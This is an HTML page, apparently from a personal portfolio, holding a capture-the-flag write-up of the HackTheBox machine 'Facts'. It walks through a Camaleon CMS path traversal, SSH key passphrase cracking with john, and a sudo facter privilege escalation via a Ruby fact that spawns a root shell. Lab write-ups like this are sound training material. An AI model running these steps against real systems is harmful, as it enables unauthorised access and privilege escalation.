@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facts — HTB Writeup | Anmol Chaudhary</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+<style>
+  .wu { max-width: 820px; margin: 0 auto; padding: 56px 20px 80px; }
+  .wu-back { font-family: var(--mono); font-size: 0.85rem; color: var(--text-dim); display: inline-flex; align-items: center; gap: 6px; margin-bottom: 24px; transition: color 0.2s ease; }
+  .wu-back:hover { color: var(--accent); text-decoration: none; }
+  .wu-meta { display: flex; align-items: center; gap: 12px; margin: 14px 0 32px; font-family: var(--mono); font-size: 0.85rem; }
+  .wu-date { color: var(--text-dim); margin-left: 6px; }
+  .wu h1 { font-size: 1.8rem; margin: 12px 0 8px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+  .wu h2 { font-size: 1.25rem; margin: 36px 0 14px; color: var(--accent); }
+  .wu h3 { font-size: 1.05rem; margin: 24px 0 10px; color: #f6efe2; }
+  .wu h4 { font-size: 0.95rem; margin: 18px 0 8px; color: var(--text); }
+  .wu p { color: var(--text); max-width: 72ch; margin: 0 0 16px; line-height: 1.65; }
+  .wu pre {
+    background: var(--surface); border: 1px solid var(--border); border-left: 3px solid var(--accent);
+    border-radius: var(--radius); padding: 14px 18px; overflow-x: auto; font-family: var(--mono);
+    font-size: 0.86rem; color: var(--ok); margin: 18px 0 24px; box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+  }
+  .wu code { font-family: var(--mono); background: var(--surface-2); padding: 2px 6px; border-radius: 3px; font-size: 0.88em; border: 1px solid var(--border); }
+  .wu pre code { background: transparent; padding: 0; border: none; font-size: inherit; }
+  .table-wrap { overflow-x: auto; margin: 20px 0; border: 1px solid var(--border); border-radius: var(--radius); }
+  .wu table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 0.85rem; text-align: left; }
+  .wu th, .wu td { padding: 10px 14px; border-bottom: 1px solid var(--border); }
+  .wu th { background: var(--surface-2); color: var(--accent); font-weight: 600; }
+  .wu tr:last-child td { border-bottom: none; }
+  .wu ul, .wu ol { color: var(--text); padding-left: 24px; margin: 12px 0 20px; }
+  .wu li { margin-bottom: 8px; }
+  .wu hr { border: none; border-top: 1px solid var(--border); margin: 36px 0; }
+</style>
+</head>
+<body>
+<header class="nav">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-prompt">anmol@portfolio<span class="nav-sep">:~$</span><span class="cursor">_</span></a>
+    <a href="../index.html#writeups" class="wu-back" style="margin-bottom:0;">&larr; writeups directory</a>
+  </div>
+</header>
+
+<main class="wu">
+  <a href="../index.html#writeups" class="wu-back">&larr; back to all writeups</a>
+  <h1>Facts</h1>
+  <div class="wu-meta">
+    <span class="os-tag os-linux">Linux</span>
+    <span class="diff-tag diff-easy">Easy</span>
+    <span class="wu-date">Pwned: 2026-05-31</span>
+  </div>
+  <h2>Machine Info</h2>
+  <div class="table-wrap"><table><thead><tr><th>Field</th><th>Details</th></tr></thead><tbody>
+  <tr><td>Machine Name</td><td>Facts</td></tr>
+  <tr><td>OS</td><td>Linux</td></tr>
+  <tr><td>Difficulty</td><td>Easy</td></tr>
+  <tr><td>Status</td><td>Pwned</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Tools Used</h2>
+  <div class="table-wrap"><table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody>
+  <tr><td>nmap</td><td>Port &amp; service enumeration</td></tr>
+  <tr><td>Camaleon CMS (CVE-2025-2304)</td><td>Authenticated path traversal / file disclosure</td></tr>
+  <tr><td>AWS CLI</td><td>S3 bucket enumeration via leaked credentials</td></tr>
+  <tr><td>ssh2john / john</td><td>Cracking the passphrase on the recovered SSH key</td></tr>
+  <tr><td>ssh</td><td>Initial foothold and lateral movement</td></tr>
+  <tr><td>facter</td><td>Sudo-abusable binary for root</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Summary</h2>
+  <p>Facts is an Easy Linux machine running a Camaleon CMS instance that allows self-registration of low-privilege accounts. The CMS (v2.9.0) is vulnerable to <strong>CVE-2025-2304</strong>, a path-traversal / file-disclosure flaw that leaks both an AWS S3 access token embedded in the dashboard and the server's <code>/etc/passwd</code>. Connecting to the S3 endpoint recovers a passphrase-protected SSH key whose passphrase cracks to <code>dragonballz</code>; combined with a username enumerated from the leaked <code>passwd</code>, this gives an initial foothold as <code>trivia</code>. Privilege escalation abuses a passwordless <code>sudo</code> entry for <code>facter</code>, whose custom-fact Ruby evaluation is used to spawn a root shell.</p>
+  <hr>
+  <h2>Reconnaissance</h2>
+  <h3>Initial Scan (NMAP)</h3>
+  <p>An aggressive nmap scan shows only two open ports — SSH and an nginx web server that redirects to <code>facts.htb</code>.</p>
+  <pre><code># Nmap 7.98 scan initiated as: nmap -sC -sV -A -oN scan.txt 10.129.227.142
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.26.3 (Ubuntu)
+|_http-title: Did not follow redirect to http://facts.htb/
+|_http-server-header: nginx/1.26.3 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+  <p><strong>Open Ports:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>22</td><td>ssh</td><td>OpenSSH 9.9p1</td><td>Used later for the foothold with recovered credentials.</td></tr>
+  <tr><td>80</td><td>http</td><td>nginx 1.26.3</td><td>Hosts a Camaleon CMS site; redirects to facts.htb. Add it to /etc/hosts.</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Vulnerability Identification</h2>
+  <h3>Identified Technologies</h3>
+  <div class="table-wrap"><table><thead><tr><th>Technology</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>Camaleon CMS</td><td>2.9.0</td><td>Admin dashboard allows self-registration; vulnerable to path traversal.</td></tr>
+  <tr><td>AWS S3</td><td>N/A</td><td>Access token exposed inside the authenticated dashboard.</td></tr>
+  </tbody></table></div>
+  <h3>CVEs / Vulnerabilities Identified</h3>
+  <div class="table-wrap"><table><thead><tr><th>CVE</th><th>Description</th><th>Severity</th></tr></thead><tbody>
+  <tr><td>CVE-2025-2304</td><td>Path traversal / arbitrary file read in Camaleon CMS, usable by an authenticated low-privilege user to disclose files such as /etc/passwd.</td><td>High</td></tr>
+  <tr><td>Sudo misconfiguration</td><td>trivia may run /usr/bin/facter as root without a password; custom Ruby facts allow arbitrary command execution as root.</td><td>High</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Initial Access</h2>
+  <h4>CMS Enumeration &amp; Registration</h4>
+  <p>Browsing the site reveals an admin area at <code>facts.htb/admin</code> where clients can register an account with low permissions. After registering and logging in, the dashboard identifies itself as <strong>Camaleon CMS v2.9.0</strong> — a version affected by CVE-2025-2304.</p>
+  <h4>Credential Harvesting</h4>
+  <p>The authenticated dashboard exposes AWS S3 access details (access key ID and connection info) for a backend bucket. Connecting to that endpoint and traversing it recovers a private SSH key. The key is passphrase-protected, so it is converted and cracked offline:</p>
+  <pre><code>ssh2john facts.id &gt; facts_id.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt facts_id.hash
+# passphrase recovered:
+dragonballz</code></pre>
+  <p>Separately, the Camaleon dashboard's path-traversal flaw (CVE-2025-2304) is abused to download <code>/etc/passwd</code>, which enumerates two interactive users:</p>
+  <pre><code>trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
+william:x:1001:1001::/home/william:/bin/bash</code></pre>
+  <p><strong>Credentials Found:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Username</th><th>Password / Secret</th><th>Service</th></tr></thead><tbody>
+  <tr><td>trivia</td><td>dragonballz</td><td>SSH</td></tr>
+  <tr><td>william</td><td>N/A (user enumerated from /etc/passwd)</td><td>OS user</td></tr>
+  </tbody></table></div>
+  <h4>Foothold as trivia</h4>
+  <p>Using <code>trivia</code> as the username with the cracked passphrase <code>dragonballz</code> grants an SSH session on the box. The user flag lives under <code>/home/william</code> — reachable because it was the previous working directory referenced during the session — rather than in trivia's own home.</p>
+  <pre><code>ssh trivia@facts.htb
+# password: dragonballz
+
+trivia@facts:~$ cat /home/william/user.txt
+---CENSORED---</code></pre>
+  <hr>
+  <h2>Privilege Escalation</h2>
+  <h3>Enumeration</h3>
+  <p>Checking sudo rights shows that <code>trivia</code> can run <code>/usr/bin/facter</code> as root without a password. Facter (part of the Puppet ecosystem) loads custom facts written as Ruby scripts from a directory you control — which means arbitrary Ruby, and therefore arbitrary commands, run as root.</p>
+  <pre><code>trivia@facts:~$ sudo -l
+    (root) NOPASSWD: /usr/bin/facter</code></pre>
+  <h3>Root via Custom Facter Fact</h3>
+  <p>A malicious custom fact is dropped into trivia's home directory and loaded via <code>--custom-dir</code>, spawning a root shell:</p>
+  <pre><code>echo 'exec("/bin/bash")' &gt; exploit.rb
+sudo /usr/bin/facter --custom-dir /home/trivia/
+
+# root shell
+whoami
+# root</code></pre>
+  <h3>Root Flag</h3>
+  <pre><code>cat /root/root.txt
+---CENSORED---</code></pre>
+  <hr>
+  <p>Completed as part of HackTheBox practice in a legal, controlled environment.</p>  <p><em>Completed as part of HackTheBox practice in a legal, controlled environment.</em></p>
+</main>
+
+<footer class="footer">
+  <p>&copy; <span id="year"></span> Anmol Chaudhary — built with HTML, CSS, and curiosity.</p>
+</footer>
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+<script type="module" src="../js/modules/writeup.js"></script>
+</body>
+</html>
